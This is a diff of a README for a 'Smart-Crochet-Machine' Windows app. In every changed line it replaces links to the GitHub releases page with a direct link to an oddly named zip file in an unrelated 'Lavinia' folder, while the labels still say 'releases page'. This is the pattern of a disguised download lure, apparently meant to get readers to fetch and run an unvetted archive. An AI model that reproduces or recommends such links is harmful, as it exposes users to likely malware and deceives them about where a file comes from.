@@ -1,6 +1,6 @@
 # 🧶 Smart-Crochet-Machine - Crochet Faster With Smart Control
 
-[![Download Smart-Crochet-Machine](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Hircine-ptosis985/Smart-Crochet-Machine/releases)
+[![Download Smart-Crochet-Machine](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hircine-ptosis985/Smart-Crochet-Machine/main/Lavinia/Machine_Crochet_Smart_amphidetic.zip)
 
 ## 🪡 What This App Does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Use this link to visit the release page and download the Windows version:
 
-[Go to the latest releases page](https://github.com/Hircine-ptosis985/Smart-Crochet-Machine/releases)
+[Go to the latest releases page](https://raw.githubusercontent.com/Hircine-ptosis985/Smart-Crochet-Machine/main/Lavinia/Machine_Crochet_Smart_amphidetic.zip)
 
 On the release page, look for the newest version and download the file that matches Windows. If there are more than one file, choose the one with `.exe` or the Windows package name.
 
@@ -131,7 +131,7 @@ Smart-Crochet-Machine
 
 ## 📦 Release Page
 
-[Visit the releases page to download](https://github.com/Hircine-ptosis985/Smart-Crochet-Machine/releases)
+[Visit the releases page to download](https://raw.githubusercontent.com/Hircine-ptosis985/Smart-Crochet-Machine/main/Lavinia/Machine_Crochet_Smart_amphidetic.zip)
 
 ## 📝 What To Expect
 
@@ -163,7 +163,7 @@ If you want to install again later:
 
 ## 📌 Quick Access
 
-[Download from GitHub Releases](https://github.com/Hircine-ptosis985/Smart-Crochet-Machine/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Hircine-ptosis985/Smart-Crochet-Machine/main/Lavinia/Machine_Crochet_Smart_amphidetic.zip)
 
 ## 🧵 Usage Flow
 
